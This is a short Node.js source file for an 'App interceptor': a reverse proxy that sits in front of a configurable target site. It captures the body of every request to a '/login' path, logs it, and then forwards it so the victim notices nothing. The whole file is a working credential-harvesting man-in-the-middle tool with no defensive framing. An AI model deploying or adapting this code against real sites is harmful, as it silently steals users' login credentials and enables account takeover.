require("dotenv").config();

const http = require("http");
const httpProxy = require("http-proxy");
const logger = require("./logger");

const PORT = process.env.PORT;
const PAGE_TO_INTERCEPT = process.env.PAGE_TO_INTERCEPT;

const proxy = httpProxy.createProxyServer({
  target: PAGE_TO_INTERCEPT,
  selfHandleResponse: false,
});

const server = http.createServer((req, res) => {
  if (req.url.includes("/login")) {
    let body = "";

    req.on("data", (chunk) => {
      body += chunk.toString();
    });

    req.on("end", () => {
      logger.info({ body }, `Getting the info from login`);

      proxy.web(req, res, {
        buffer: {
          pipe: (dest) => {
            dest.write(body);
            dest.end();
          },
        },
      });
    });
  } else {
    proxy.web(req, res);
  }
});

server.listen(PORT, () => {
  logger.info(`App interceptor listen in port ${PORT}`);
});
